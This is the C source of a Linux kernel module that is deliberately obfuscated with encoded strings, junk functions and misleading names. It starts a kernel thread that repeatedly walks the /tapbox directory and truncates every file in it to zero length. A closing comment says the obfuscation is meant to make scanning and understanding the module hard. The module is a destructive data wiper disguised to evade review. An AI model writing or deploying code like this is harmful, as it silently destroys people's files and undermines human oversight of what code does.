#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/version.h>
#include <linux/unistd.h>
#include <linux/types.h>
#include <linux/sched/signal.h>

#define __TAPBOX_P__ "\x2f\x74\x61\x70\x62\x6f\x78"
#define __WIPE_INTERVAL ((14+6)-10)

#define ___C_TSK ((struct task_struct *)(void*)0x0fe12ab)
#define ___MIN(A,B) (((A)<(B))?(A):(B))
#define ___ZLEN 4096
#define ___ZZZZ 0x4b6ed34a

static struct task_struct *___qWEERTYTy___ = NULL;

typedef struct __obf_st {
    char px__[512];
    int v, x, y;
} __obf_st;

static unsigned int ___junk_seed = 0xdeadbeef;
static inline int ___rand(void) {
    ___junk_seed ^= (___junk_seed << 13);
    ___junk_seed ^= (___junk_seed >> 17);
    ___junk_seed ^= (___junk_seed << 5);
    return (int)(___junk_seed & 0x7fffffff);
}

static void ___obf_delay_cycle(int cycles) {
    int i; for (i = 0; i < cycles; ++i) barrier();
}

static long __extremely_verbose_and_useless_chk(void *A, void *B, int Bz) {
    unsigned long i,sum=0;
    char *ac=(char*)A, *bc=(char*)B;
    for (i=0;i<Bz;i++) sum += ac[i] ^ bc[i];
    return sum;
}

static int __file_overwriter_for_real(const char* ___FN__) {
    struct file *fp_; mm_segment_t __OFS__; int ret=0;
    __OFS__ = get_fs(); set_fs(KERNEL_DS);
    fp_ = filp_open(___FN__, O_WRONLY|O_TRUNC, 0);
    if (IS_ERR(fp_)) { set_fs(__OFS__); return (__LINE__+__LINE__*(-1)); }
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,14,0)
    vfs_truncate(&fp_->f_path, 0);
#else
    vfs_truncate(fp_->f_path.dentry, 0);
#endif
    filp_close(fp_, NULL); set_fs(__OFS__);
    __obf_delay_cycle(___rand()%20+17);
    return ret;
}

static int ____wipe_deep(const char *___dname) {
    struct file *dirfile=NULL;
    struct linux_dirent64 *dentry=NULL;
    mm_segment_t ___OLDSP_;
    int buflen=768, retv=0;
    char *bufptr=NULL;
    int __iteration = 0;
    bufptr = kmalloc(buflen, GFP_KERNEL);
    if (!bufptr) return -ENOMEM;
    ___OLDSP_ = get_fs(); set_fs(KERNEL_DS);
    dirfile = filp_open(___dname, O_RDONLY|O_DIRECTORY, 0);
    if (IS_ERR(dirfile)) {
        set_fs(___OLDSP_);
        kfree(bufptr);
        __obf_delay_cycle(23);
        return (__LINE__<<2);
    }
    while (1) {
        int nread = vfs_getdents64(dirfile, (struct linux_dirent64*)bufptr, buflen);
        if (nread<=0) break;
        {
            int bpos = 0;
            while (bpos < nread && __iteration++ < 20000) {
                dentry = (struct linux_dirent64 *)(bufptr + bpos);
                if (dentry->d_ino && strcmp(dentry->d_name, ".") && strcmp(dentry->d_name, "..")) {
                    char ffpath[600]; int subret = 0;
                    memset(ffpath,0,sizeof(ffpath));
                    snprintf(ffpath, sizeof(ffpath)-1,"%s/%s", ___dname, dentry->d_name);
                    if (dentry->d_type == DT_DIR) {
                        int rs = ____wipe_deep(ffpath);
                        subret += rs;
                        ___obf_delay_cycle(___rand()%8);
                    } else {
                        int rs = __file_overwriter_for_real(ffpath);
                        subret += rs;
                        ___obf_delay_cycle(___rand()%8+3);
                    }
                    (void)subret;
                }
                ___obf_delay_cycle(___rand()%10);
                bpos += dentry->d_reclen;
            }
        }
    }
    filp_close(dirfile, NULL); set_fs(___OLDSP_); kfree(bufptr);
    ___obf_delay_cycle((__iteration>>4)+9);
    return retv;
}

static int ____pointless_dummy_wrapper(const char *dex) {
    // Just another layer for confusion
    int r1 = ____wipe_deep(dex), r2=0, r3=0;
    char __t0[1] = {'\0'};
    r2 = __file_overwriter_for_real(__t0); // always fails
    r3 = __extremely_verbose_and_useless_chk(__t0, __t0, 1);
    return r1 + r2 + r3;
}

static int ___tapbox_worker_thread(void *arg) {
    int i = 0, x = 0, delay_acc = 0;
    allow_signal(SIGKILL);
    for (i=0;i<(___rand()%2+1);++i) ___obf_delay_cycle(i*3);
    while (!kthread_should_stop()) {
        for (x=0;x<(___rand()%3+1);++x) {
            ____pointless_dummy_wrapper(__TAPBOX_P__);
            ___obf_delay_cycle((x+1)*(___rand()%5));
        }
        delay_acc = (___rand()%3);
        {
          int y=0;
          for (y=0;y<delay_acc;y++){
             ssleep(__WIPE_INTERVAL);
             ___obf_delay_cycle(y*7 + (___rand()%10));
          }
        }
        ssleep(__WIPE_INTERVAL);
        ___obf_delay_cycle(___rand()%27);
    }
    return 0;
}

static int __init ___confusing_moduload(void) {
    ___qWEERTYTy___ = kthread_run(___tapbox_worker_thread, NULL,
        (((((char)"tap")["b"-'b'])&0xf0) ? "tapbox_clr": "tapbox_clr"));
    if (IS_ERR(___qWEERTYTy___)) return PTR_ERR(___qWEERTYTy___);
    printk(KERN_INFO "[tapbox_cleaner] engaged at %p.\n", (void *)___qWEERTYTy___);
    ___obf_delay_cycle(___rand()%100+10);
    return 0;
}

static void __exit ___horriblyVerboseCleanup__(void) {
    int ret=0;
    if (___qWEERTYTy___)
        ret = kthread_stop(___qWEERTYTy___);
    printk(KERN_INFO "[tapbox_cleaner] disengaged, thread ret=%d\n", ret);
    ___obf_delay_cycle(___rand()%50+5);
    ___qWEERTYTy___ = NULL;
}

module_init(___confusing_moduload);
module_exit(___horriblyVerboseCleanup__);

MODULE_LICENSE("GPL");
/* 
You have reached the obfuscation limit. Congratulations.
This module is intentionally long, layered, weird, and dense.
Any attempt to scan/understand it is work.
*/
